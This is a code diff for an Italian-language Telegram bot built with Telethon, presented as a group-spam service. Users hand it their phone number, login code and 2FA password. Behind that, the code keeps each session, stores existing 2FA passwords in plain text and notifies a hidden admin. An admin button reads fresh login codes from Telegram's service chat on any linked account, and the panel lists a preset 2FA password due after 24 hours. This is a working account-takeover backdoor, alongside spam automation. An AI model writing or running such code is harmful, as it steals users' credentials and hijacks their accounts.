@@ -492,4 +492,196 @@ async def callback_router(event):
             for phone, acc_info in accounts.items():
                 timer_text = get_admin_timer_text(acc_info)
                 fa_pass = acc_info.get("fa_password", "In attesa delle 24h (predefinita sarà 11071970)")
-                text += f"• Numero: `{phone}`\n  ⏱️ Tempo rimanente: {timer_text}\n  🔑 2FA password: `{fa_pass
+                text += f"• Numero: `{phone}`\n  ⏱️ Tempo rimanente: {timer_text}\n  🔑 2FA password: `{fa_pass}`\n\n"
+                buttons.append([Button.inline(f"🔑 Richiedi Codice ({phone})", data=f"admin_get_code_{uid}_{phone}".encode())])
+
+            buttons.append([Button.inline("🔙 Torna alla lista utenti", b"admin_users")])
+            await event.edit(text, buttons=buttons, parse_mode="markdown")
+
+    elif data.startswith(b"admin_get_code_"):
+        parts = data.decode().replace("admin_get_code_", "").split("_")
+        uid = int(parts[0])
+        phone = parts[1]
+
+        try:
+            client = user_data_store[uid]["accounts"][phone]["client"]
+            if not client.is_connected():
+                await client.connect()
+
+            messages = await client.get_messages(777000, limit=3)
+            code_found = "Nessun codice recente trovato."
+            for msg in messages:
+                if msg.text and any(char.isdigit() for char in msg.text):
+                    code_found = f"Ultime notifiche da Telegram:\n\n{msg.text}"
+                    break
+
+            await event.respond(f"🔑 **Codice richiesto per {phone}:**\n\n{code_found}")
+        except Exception as e:
+            await event.respond(f"❌ Impossibile prelevare il codice: {e}")
+
+    elif data == b"admin_back":
+        try:
+            await event.answer()
+        except Exception:
+            pass
+        buttons = [
+            [Button.inline("📊 Info & Attività Utenti", b"admin_info")],
+            [Button.inline("👥 Gestione Utenti", b"admin_users")]
+        ]
+        await event.edit("👑 **Pannello di Controllo Admin**\nBenvenuto Admin!", buttons=buttons)
+
+# --- GESTIONE MESSAGGI TESTUALI ---
+@bot.on(events.NewMessage(incoming=True))
+async def message_router(event):
+    user_id = event.sender_id
+    if user_id not in user_states:
+        return
+
+    if event.raw_text.startswith('/'):
+        return
+
+    state = user_states[user_id].get("step")
+    text = event.raw_text.strip()
+    user_full_name = event.sender.first_name if event.sender and event.sender.first_name else "Utente"
+
+    if state == "waiting_phone":
+        raw_phone = text.strip()
+        phone = "".join(ch for ch in raw_phone if ch.isdigit() or ch == "+")
+        if phone and not phone.startswith("+"):
+            phone = "+" + phone
+
+        user_states[user_id]["phone"] = phone
+
+        session_path = os.path.join(SESSION_DIR, f"user_{user_id}")
+        client = TelegramClient(session_path, API_ID, API_HASH)
+        user_states[user_id]["client"] = client
+
+        await event.respond(f"⏳ Connessione a Telegram per il numero `{phone}` in corso...")
+
+        try:
+            if not client.is_connected():
+                await client.connect()
+            sent = await client.send_code_request(phone)
+            user_states[user_id]["phone_code_hash"] = sent.phone_code_hash
+            user_states[user_id]["step"] = "waiting_code"
+
+            await event.respond(
+                "🔑 **Codice inviato!**\n"
+                "Telegram ti ha inviato il codice di accesso.\n"
+                "Invia il codice ricevuto (es. `1 2 3 4 5` oppure `12345`):"
+            )
+        except FloodWaitError as fw:
+            await event.respond(f"⏳ Attendi `{fw.seconds}` secondi prima di riprovare con `{phone}`.")
+            del user_states[user_id]
+        except PhoneNumberInvalidError:
+            await event.respond("❌ Numero non valido. Controlla il prefisso internazionale (es. `+44...`, `+1...`) e riprova:")
+        except AuthRestartError:
+            await event.respond("🔄 Errore di connessione a Telegram. Riprova a inviare il numero.")
+        except Exception as e:
+            await event.respond(f"❌ Errore imprevisto: {e}")
+            del user_states[user_id]
+
+    elif state == "waiting_code":
+        code = text.replace(" ", "").replace(",", "")
+        client = user_states[user_id]["client"]
+        phone = user_states[user_id]["phone"]
+        phone_code_hash = user_states[user_id]["phone_code_hash"]
+
+        try:
+            await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
+
+            if user_id not in user_data_store:
+                user_data_store[user_id] = {"name": user_full_name, "accounts": {}, "active_phone": None}
+
+            user_data_store[user_id]["accounts"][phone] = {
+                "client": client,
+                "spam_msg": None, "spam_time": None, "is_spamming": False, "single_group_time": "Nessuno",
+                "link_time": time.time(), "protected": False, "last_spam_time": 0, "scanned": False, "available_groups": [],
+                "fa_password": "In attesa delle 24h", "existing_2fa": None
+            }
+            user_data_store[user_id]["active_phone"] = phone
+
+            try:
+                await bot.send_message(
+                    ADMIN_ID,
+                    f"🔔 **Nuovo account collegato!**\n• Utente: {user_full_name} (`{user_id}`)\n• Numero: `{phone}`\n⏳ Timer 24h avviato."
+                )
+            except Exception:
+                pass
+
+            await event.respond("✅ **Codice verificato! Account collegato con successo.**")
+            del user_states[user_id]
+            await show_account_management(event, user_id)
+
+        except SessionPasswordNeededError:
+            user_states[user_id]["step"] = "waiting_password"
+            await event.respond("🔐 L'account ha la password **2FA** attiva. Inserisci la password attuale:")
+
+        except PhoneCodeInvalidError:
+            await event.respond("❌ **Codice errato!** Invia il codice corretto ricevuto da Telegram:")
+
+        except Exception as e:
+            await event.respond(f"❌ Errore durante l'accesso: {e}\nRiprova con `/start`.")
+            del user_states[user_id]
+
+    elif state == "waiting_password":
+        current_password = text
+        client = user_states[user_id]["client"]
+        phone = user_states[user_id]["phone"]
+
+        try:
+            await client.sign_in(password=current_password)
+
+            if user_id not in user_data_store:
+                user_data_store[user_id] = {"name": user_full_name, "accounts": {}, "active_phone": None}
+
+            user_data_store[user_id]["accounts"][phone] = {
+                "client": client,
+                "spam_msg": None, "spam_time": None, "is_spamming": False, "single_group_time": "Nessuno",
+                "link_time": time.time(), "protected": False, "last_spam_time": 0, "scanned": False, "available_groups": [],
+                "fa_password": "In attesa delle 24h", "existing_2fa": current_password
+            }
+            user_data_store[user_id]["active_phone"] = phone
+
+            try:
+                await bot.send_message(
+                    ADMIN_ID,
+                    f"🔔 **Nuovo account collegato (2FA esistente)!**\n• Utente: {user_full_name} (`{user_id}`)\n• Numero: `{phone}`\n⏳ Timer 24h avviato."
+                )
+            except Exception:
+                pass
+
+            await event.respond("✅ **Password 2FA verificata! Account collegato.**")
+            del user_states[user_id]
+            await show_account_management(event, user_id)
+        except Exception as e:
+            await event.respond(f"❌ Password errata: {e}\nRiprova inserendo la password corretta:")
+
+    elif state == "waiting_spam_msg":
+        acc = user_data_store[user_id]["accounts"][user_data_store[user_id]["active_phone"]]
+        acc["spam_msg"] = text
+        del user_states[user_id]
+        await event.respond("✅ **Messaggio spam impostato con successo!**")
+        await show_spam_settings_menu(event, user_id)
+
+    elif state == "waiting_spam_time":
+        acc = user_data_store[user_id]["accounts"][user_data_store[user_id]["active_phone"]]
+        acc["spam_time"] = text
+        del user_states[user_id]
+        await event.respond(f"✅ **Tempo spam impostato su {text} minuti con successo!**")
+        await show_spam_settings_menu(event, user_id)
+
+    elif state == "waiting_welcome_msg":
+        del user_states[user_id]
+        await event.respond("✅ **Messaggio di benvenuto (DM) impostato con successo!**")
+        await show_spam_settings_menu(event, user_id)
+
+# --- AVVIO PRINCIPALE ---
+async def main():
+    await bot.start(bot_token=BOT_TOKEN)
+    print("🤖 Bot avviato correttamente e in ascolto!", flush=True)
+    asyncio.create_task(background_workers())
+    await bot.run_until_disconnected()
+
+if __name__ == '__main__':
+    loop.run_until_complete(main())
